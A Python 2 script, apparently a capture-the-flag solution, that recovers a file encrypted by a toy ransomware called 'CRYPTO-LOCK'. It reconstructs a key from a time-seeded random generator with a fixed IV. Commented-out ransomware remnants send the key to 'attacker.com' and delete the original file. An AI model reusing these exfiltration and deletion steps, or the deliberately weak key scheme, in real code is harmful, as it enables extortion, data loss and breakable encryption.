#!/usr/bin/python
#encoding=utf-8
'''
  _     ____  ______ __   __ _____  _____   ___       _      ___    ____   _  __    _  
 | |   / ___||  __  |\ \ / /|  _  ||_   _| / _ \     | |    / _ \  / ___| | |/ /   | | 
/ __) | |    | |__| | \ . / | |_| |  | |  | | | | __ | |   | | | || |     | ' /   / __)
\__ \ | |    |  _  /   \ /  |  ___|  | |  | | | ||__|| |   | | | || |     | . \   \__ \
(   / | |___ | | \ \   | |  | |      | |  | |_| |    | |__ | |_| || |___  | |\ \  (   /
 |_|   \____||_|  \_\  |_|  |_|      |_|   \___/     |____| \___/  \____| |_| \_\  |_| 
      
'''

from Crypto.Cipher import AES
import random
import time
import os
import datetime
import string

plaintext_file = "secret.docx"
encrypted_file = "secret.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

def generate_key(size, i):
    key = bytearray()
    #random.seed(int(time.time()))
    x = datetime.datetime(2018, 04, 06, 17, 52, 37)
    t = time.mktime(x.timetuple())
    random.seed(int(t))
    print("time: ",t)
    for _ in range(size):
        key.append(random.randint(0, 255))
    return str(key)

def pad(text):
    return text + (AES.block_size - len(text) % AES.block_size) * "\xff"

def encrypt(plaintext, cipher):
    return cipher.encrypt(pad(plaintext)).encode('hex')

def main():
    with open(encrypted_file, 'r') as f:
        encryptedtext = f.read()
    for i in range(0, 1):
	key = generate_key(32, 0)
	# send_key(key.encode('hex'))
    	cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
    	plaintext = cipher.decrypt(encryptedtext.decode('hex'))
        print(i, plaintext[0:100])
        with open("answer.txt", 'w') as f:
            f.write(plaintext)
    # 😈
    # os.remove(plaintext_file)

if __name__ == "__main__":
    main()

